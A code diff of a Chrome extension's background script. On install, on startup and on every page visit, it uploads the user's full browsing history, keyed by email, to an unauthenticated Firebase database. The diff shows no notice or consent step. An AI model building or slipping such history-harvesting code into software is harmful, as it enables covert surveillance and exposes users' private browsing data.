@@ -3,14 +3,19 @@
 const firebaseBase = 'https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app';
 const seasonID     = 'season2025';
 
-// Helper: round ms → zero seconds/milliseconds → ISO string
+// Helper: round ms → minute-precision ISO string (no seconds/ms, no dots)
 function formatToMinute(ms) {
-  const d = new Date(ms);
-  d.setSeconds(0, 0);
-  return d.toISOString(); // e.g. "2025-05-01T14:07:00.000Z"
+  const d   = new Date(ms);
+  const YYYY = d.getUTCFullYear();
+  const MM   = String(d.getUTCMonth()+1).padStart(2,'0');
+  const DD   = String(d.getUTCDate()).padStart(2,'0');
+  const hh   = String(d.getUTCHours()).padStart(2,'0');
+  const mm   = String(d.getUTCMinutes()).padStart(2,'0');
+  // e.g. "2025-05-02T08:39Z"
+  return `${YYYY}-${MM}-${DD}T${hh}:${mm}Z`;
 }
 
-// 1) Full history dump on install & startup
+// ——— FULL SYNC on install & startup ———
 chrome.runtime.onInstalled.addListener(initFullSync);
 chrome.runtime.onStartup.addListener(initFullSync);
 
@@ -24,35 +29,49 @@ function initFullSync() {
 
 function uploadFullDump(allItems) {
   chrome.storage.local.get('userEmail', ({ userEmail }) => {
-    const email     = userEmail || 'anonymous@demo.com';
-    const safeMail  = btoa(email).replace(/=+$/, '');
-    const url       = `${firebaseBase}/history/${seasonID}/${safeMail}.json`;
+    const rawEmail = userEmail || 'anonymous@demo.com';
+    // Firebase keys can’t contain “.” so we swap them for commas
+    const emailKey = rawEmail.replace(/\./g, ',');
+    const baseUrl  = `${firebaseBase}/history/${seasonID}/${emailKey}/visited`;
 
-    // Store full array under “visited”
-    fetch(url, {
-      method: 'PATCH',
-      body: JSON.stringify({ visited: allItems })
-    })
-    .catch(console.error);
+    // build a map: minute-key → full HistoryItem
+    const byMinute = {};
+    allItems.forEach(item => {
+      const key = formatToMinute(item.lastVisitTime);
+      byMinute[key] = item;
+    });
+
+    // overwrite entire /visited node with this map
+    fetch(`${baseUrl}.json`, {
+      method: 'PUT',
+      body: JSON.stringify(byMinute)
+    }).catch(console.error);
   });
 }
 
-// 2) Real-time listener
+// ——— INCREMENTAL SYNC on each new visit ———
 chrome.history.onVisited.addListener(({ url, lastVisitTime }) => {
-  queueVisitForUpload(url, lastVisitTime);
-});
+  const minuteKey = formatToMinute(lastVisitTime);
 
-function queueVisitForUpload(url, msSinceEpoch) {
   chrome.storage.local.get('userEmail', ({ userEmail }) => {
-    const email     = userEmail || 'anonymous@demo.com';
-    const safeMail  = btoa(email).replace(/=+$/, '');
-    const endpoint  = `${firebaseBase}/history/${seasonID}/${safeMail}/visited.json`;
-    const timestamp = formatToMinute(msSinceEpoch);
+    const rawEmail = userEmail || 'anonymous@demo.com';
+    const emailKey = rawEmail.replace(/\./g, ',');
+    const endpoint = `${firebaseBase}/history/${seasonID}/${emailKey}/visited/${minuteKey}.json`;
 
-    fetch(endpoint, {
-      method: 'POST',
-      body: JSON.stringify({ url, timestamp })
-    })
-    .catch(console.error);
+    // fetch the full HistoryItem so we get title, visitCount, etc.
+    chrome.history.search({
+      text: url,
+      startTime: lastVisitTime - 1,
+      maxResults: 1
+    }, (results) => {
+      if (!results || !results[0]) return;
+      const fullItem = results[0];
+      fullItem.timestamp = minuteKey;  // optional
+      // PUT here to overwrite any prior visit in the same minute
+      fetch(endpoint, {
+        method: 'PUT',
+        body: JSON.stringify(fullItem)
+      }).catch(console.error);
+    });
   });
-}
+});
